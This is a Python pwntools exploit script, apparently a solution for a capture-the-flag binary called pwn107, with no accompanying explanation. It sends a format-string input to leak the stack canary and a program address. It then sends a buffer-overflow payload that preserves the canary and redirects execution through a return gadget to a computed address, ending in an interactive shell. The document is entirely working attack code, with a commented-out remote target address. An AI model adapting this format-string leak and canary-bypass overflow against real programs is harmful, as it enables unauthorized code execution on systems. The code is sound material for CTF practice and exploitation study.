
from pwn import *
from sys import argv

context.log_level = "debug"
context.binary = binary = ELF('./pwn107')

p = process('./pwn107')
#p =remote('10.10.104.36', 9007)
#gdb.attach(p, '''  ''')

p.recvuntil(b'streak?')
p.sendline(b'%13$p-%17$p')
#p.recv()
p.recv()
resp = p.recv()

resp = resp.split(b'\n')[1].split(b': ')[1].split(b'-')
#resp = resp.split(b'\n')[0].split(b"-")
#resp = resp.split(b'-')
print(resp)

canary = str(resp[0]).replace('b', '').replace("'", '')
elfAddress = str(resp[1]).replace('b', '').replace("'", '')
retGadget  = hex(int(elfAddress, 16)-0x1)
elfAddress = hex(int(elfAddress, 16)-0x46)

print("[+] Canary address : ", canary)
print("[+] ELF address : ", elfAddress)

payload = b'A'*24
payload += p64(int(canary, 16))
payload += b"B"*8
payload += p64(int(retGadget, 16))
payload += p64(int(elfAddress, 16))

p.sendline(payload)

recv = p.recv()

print("Final ", recv)

p.interactive()
